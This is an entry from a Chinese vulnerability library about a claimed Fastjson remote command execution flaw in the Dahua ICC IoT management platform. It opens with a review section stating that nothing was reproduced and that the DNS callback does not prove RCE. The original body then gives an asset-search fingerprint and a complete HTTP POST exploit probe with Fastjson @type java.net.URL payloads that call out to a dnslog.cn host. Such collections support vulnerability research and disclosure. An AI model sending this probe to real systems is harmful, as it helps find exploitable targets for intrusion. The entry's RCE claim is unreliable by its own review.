---
source: "wy876 漏洞文库"
id: "vw-14b4b5415f2f1de10fe7a1ae"
entity_id: "ve-14b4b5415f2f1de10fe7a1ae"
schema_version: "1"
fofa_unverified: "web.body="
title: "大华智能物联综合管理平台(ICC)random fastjson远程命令执行"
product: "Dahua ICC"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "版本/JDK/Fastjson配置未知，无Cookie"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E5%A4%A7%E5%8D%8E/%E5%A4%A7%E5%8D%8E%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%28ICC%29randomfastjson%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据；回连样例可能向外部地址发送网络请求或建立会话；应使用自己的隔离回连服务，DNS/LDAP 到达只能证明相应交互，不能单独证明 RCE"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ggsmd59d5g6pzrnd"
source_status: "recorded"
---

# 大华智能物联综合管理平台(ICC)random fastjson远程命令执行

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Dahua ICC
- 本文讨论：evo-runs random Fastjson URL DNS解析探测；RCE尚未证明
- 版本、权限与配置前提：版本/JDK/Fastjson配置未知，无Cookie
- 资料类型：Fastjson解析探针；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 仅DNS回连不能证明RCE、可用gadget或反序列化控制服务器，标题和影响超出证据
- 载荷非标准JSON且含Set/Fastjson扩展及不平衡结构，应保留原始字节并核解析路径，不擅自修成普通JSON
- 文本HTTP/2带Connection close为HTTP1样式，传输表达不规范；Content-Length固定不随域名变
- 无回连日志/原始技术来源，Hunter元数据残缺
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据
- 回连样例可能向外部地址发送网络请求或建立会话；应使用自己的隔离回连服务，DNS/LDAP 到达只能证明相应交互，不能单独证明 RCE

### 待核与来源

- 解析版本/AutoType/gadget链/JDK条件与真实回连待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
浙江大华技术股份有限公司，是全球领先的以视频为核心的智慧物联解决方案提供商和运营服务商，大华智能物联综合管理平台random 存在fastjson远程命令执行，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 大华智能物联综合管理平台(ICC)

# 三、资产测绘
+ hunter`web.body="*客户端会小于800*"`
+ 特征


# 四、漏洞复现
poc：前往dnslog获取一个地址替换下列poc中的地址发起请求

```http
POST /evo-runs/v1.0/auths/sysusers/random HTTP/2
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0)
Connection: close
Content-Length: 372
Content-Type: application/json;charset=utf-8
Accept-Encoding: gzip, deflate

{"a":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.net.URL","val":"http://spjm2r.dnslog.cn"}}""},"b":{{"@type":"java.net.URL","val":"http://spjm2r.dnslog.cn"}:"x"},"c":{{"@type":"java.net.URL","val":"http://spjm2r.dnslog.cn"}:0,"d":Set[{"@type":"java.net.URL","val":"http://spjm2r.dnslog.cn"}],"e":Set[{"@type":"java.net.URL","val":"http://spjm2r.dnslog.cn"},}
```


dns收到响应


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ggsmd59d5g6pzrnd>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
